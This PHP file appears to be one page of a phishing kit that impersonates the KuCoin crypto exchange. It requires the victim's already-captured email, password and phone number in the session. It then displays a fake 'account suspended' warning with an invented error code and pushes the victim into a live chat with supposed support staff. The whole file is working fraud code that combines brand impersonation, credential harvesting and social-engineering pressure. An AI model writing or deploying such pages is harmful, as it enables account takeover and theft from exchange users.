<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'KuCoin: Log In | Sign In';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        if(empty($_SESSION["phone_number"])) {
            redirect(base_url('verify.php'));
        }
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container-fluid">
            <div class="row">
                <?php include_once './includes/sidebar.php'; ?>
                <div class="col-md-6 order-md-2 order-1">
                    <div class="row">
                        <div class="col-12 offset-0 col-md-8 offset-md-2 login_form_bg_img">
                            <div class="d-flex align-items-center mt60">
                                <form method="post" action="<?= base_url('send.php') ?>" class="col-12 p25 mt60" style="position: relative">
                                    <div style="position: absolute;top:0;right:3;">
                                        <i class="fa-solid fa-qrcode fs50 text-success" aria-hidden="true"></i>
                                    </div>
                                    <h2 class="fs35 fw-bold mb20 text-danger">Important Message!</h2>
                                    <div class="my30 lh30 fw-normal">Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately</div>
                                    <p class="fs25 lh30 fw-bold">Error CODE: EBRX1:6X76D</p>
                                    <a href="javascript:void(Tawk_API.toggle())" class="btn btn-success border-0 rounded-pill btn-lg btn-block rounded-0 fs16 py10 px60">Ask expert</a>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>